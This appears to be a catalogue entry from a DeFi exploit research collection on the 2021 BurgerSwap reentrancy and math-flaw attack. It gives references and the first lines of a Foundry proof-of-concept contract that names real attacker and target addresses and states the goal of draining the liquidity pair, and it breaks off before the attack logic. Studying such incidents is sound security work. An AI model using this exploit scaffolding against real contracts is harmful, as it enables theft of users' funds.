# [?] BurgerSwap - Mathematical flaw + Reentrancy

## Summary
Severity: Unknown
Chain: BNB Chain
Component: BurgerSwap
Published: 2021-05-27
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/BurgerSwap_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://bscscan.com/tx/0xac8a739c1f668b13d065d56a03c37a686e0aa1c9339e79fcbc5a2d0a6311e333
- https://lunaray.medium.com/burgerswap-attack-analysis-c0345541d69
- https://quillhashteam.medium.com/burgerswap-flash-loan-attack-analysis-888b1911daef

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Attacker: 0x6c9f2b95ca3432e5ec5bcd9c19de0636a23a4994
// Attack Contract: 0xae0f538409063e66ff0e382113cb1a051fc069cd
// Objective: Drain funds in the vulnerable Burger LP contract: 0x7ac55ac530f2c29659573bde0700c6758d69e677 (Demax WBNB<>BURGER pair)
// Attack Tx: https://phalcon.xyz/tx/bsc/0xac8a739c1f668b13d065d56a03c37a686e0aa1c9339e79fcbc5a2d0a6311e333
//            https://bscscan.com/tx/0xac8a739c1f668b13d065d56a03c37a686e0aa1c9339e79fcbc5a2d0a6311e333

// @Analyses (somewhat similar to Impossible Finance exploit)
// https://lunaray.medium.com/burgerswap-attack-analysis-c0345541d69
// https://quillhashteam.medium.com/burgerswap-flash-loan-attack-analysis-888b1911daef

contract Exploit is Test {
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant BURGER = IERC20(0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f);

    IUniswapV2Pair private constant USDT_WBNB = IUniswapV2Pair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);

    IDemaxPlatform private constant demaxPlatform = IDemaxPlatform(0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0); // router
    IDemaxDelegate private constant demaxDelegate = IDemaxDelegate(0xd0dd735851C1Ca61d0324291cCD3959d2153A88d); // factory

    FAKE_TOKEN FAKE;

    function setUp() public {
        vm.createSelectFork("bsc", 7_781_159);
    }

    function testExploit() public {
        // BURGER and WBNB in Pair before: 164603 <> 3038
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/BurgerSwap_exp.sol_
